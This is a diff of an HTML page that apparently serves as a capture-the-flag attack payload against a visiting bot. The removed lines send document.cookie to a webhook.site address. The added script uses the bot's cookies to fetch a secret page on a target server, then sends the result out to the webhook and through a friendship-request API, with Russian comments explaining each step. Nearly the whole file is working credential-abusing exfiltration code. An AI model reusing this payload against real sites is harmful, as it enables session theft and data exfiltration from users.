@@ -1,15 +1,40 @@
-<!DOCTYPE html>
+<! DOCTYPE html>
 <html>
-<head>
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-</head>
 <body>
     <script>
-        // Отправляем User-Agent (информация о браузере)
-        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?cookies=' + encodeURIComponent(document.cookie))
+        // Отправляем тестовый запрос на webhook (для проверки что скрипт работает)
+        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?step=1_script_loaded');
+        
+        // Делаем запрос на секретную страницу Кранга
+        // Браузер бота АВТОМАТИЧЕСКИ отправит его cookies с этим запросом! 
+        fetch('http://158.160.184.159:13002/kraang/brain', {
+            credentials: 'include'  // Браузер сам добавит cookies бота! 
+        })
+        .then(response => response.text())
+        .then(secretData => {
+            // Отправляем флаг на webhook
+            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?flag=' + encodeURIComponent(secretData));
+            
+            // И ещё отправляем через friendship request
+            return fetch('http://158.160.184.159:13002/api/friendship/request', {
+                method: 'POST',
+                credentials: 'include',  // Cookies бота снова автоматически!
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    to_user: "admin2",
+                    message: secretData
+                })
+            });
+        })
+        .then(() => {
+            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?step=2_attack_complete');
+        })
+        .catch(error => {
+            fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?error=' + encodeURIComponent(error.toString()));
+        });
     </script>
-    <p>Loading...</p>
+    <p>Loading...  v7</p>
 </body>
 </html>
